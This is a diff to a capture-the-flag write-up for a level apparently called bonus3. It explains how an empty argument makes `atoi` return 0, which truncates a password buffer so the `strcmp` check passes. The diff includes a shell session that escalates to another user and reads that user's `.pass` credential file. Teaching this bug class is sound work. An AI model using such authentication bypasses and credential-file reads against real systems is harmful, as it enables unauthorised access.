@@ -21,19 +21,50 @@ int main(int argc, char **argv) {
 }
 ```
 
-The bug is `buffer[atoi(argv[1])] = 0`: we place a null at any index. To get the shell, `buffer` (the password, truncated at that index) must equal `argv[1]`. Matching the real password needs `argv[1]` to both equal a length-N prefix of the password and have `atoi(argv[1]) == N`, a circular constraint.
+`buffer` holds the real password (read from a file only `end` can open), and `buffer[atoi(argv[1])] = 0` drops a null byte at whatever index we ask for, anywhere in `buffer`. To get a shell, the string that results, the real password truncated at that index, has to equal `argv[1]` itself. That is circular: `argv[1]` would have to be both a correct prefix of a password we cannot read and a number whose `atoi()` equals that prefix's own length.
 
 ## Exploit
 
-Sidestep it with `N = 0`. For `argv[1] = ""`:
+Sidestep the whole circle with `N = 0`: pass `argv[1] = ""`.
 
-- `atoi("") = 0`, so `buffer[0] = 0` makes `buffer` the empty string,
-- `strcmp("", "") == 0` → shell.
+- `atoi("")` returns 0, not an error. There is no libc exception for "not a number", it just falls back to 0:
 
-The empty string matches itself, no password needed. It must be exactly empty: a non-numeric arg like `"abc"` also gives `atoi = 0`, but then `strcmp("", "abc") != 0`. And `argc != 2` requires exactly one argument, so `./bonus3 ""` (argc 2, empty arg) is the only form that works.
+```
+$ python -c "int('')"
+Traceback (most recent call last):
+ValueError: invalid literal for int() with base 10: ''
+$ python -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6')
+libc.atoi.restype = ctypes.c_int
+print libc.atoi('')
+"
+0
+```
+
+  Python's `int()` is strict and raises on this input; C's `atoi()` is not, and quietly returns 0 for anything it cannot parse. That gap is what makes `N = 0` reachable from an empty argument in the first place.
+
+- `atoi("") == 0` means `buffer[0] = 0`, truncating `buffer` to the empty string.
+- `strcmp("", "")` is `0`: two empty strings are always equal, no matter what the real password is.
+
+So `argv[1] = ""` compares the empty string to itself and always passes, without ever needing to know a single byte of the actual password. Two things make `""` the *only* string that works:
+
+```
+$ ./bonus3 "abc"        # atoi("abc") is also 0, but argv[1] itself is "abc"
+$ echo $?
+0                        # buffer[0]=0 truncates buffer to "", but strcmp("", "abc") != 0, no shell
+
+$ ./bonus3 "" "extra"    # a second argument makes argc == 3
+$ echo $?
+255                      # argc != 2, returns -1 before touching buffer at all
+```
+
+`"abc"` reaches the same `atoi() == 0` outcome but fails `strcmp` because `argv[1]` itself is not empty; only `argv[1] = ""` makes both sides of the comparison the same string. And `argc != 2` requires exactly one argument, so `./bonus3 ""` (one empty argument, `argc == 2`) is the only invocation that reaches a shell.
 
 ```bash
-./bonus3 ""
+$ ./bonus3 ""
+id
+uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
 cat /home/user/end/.pass
 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
 ```
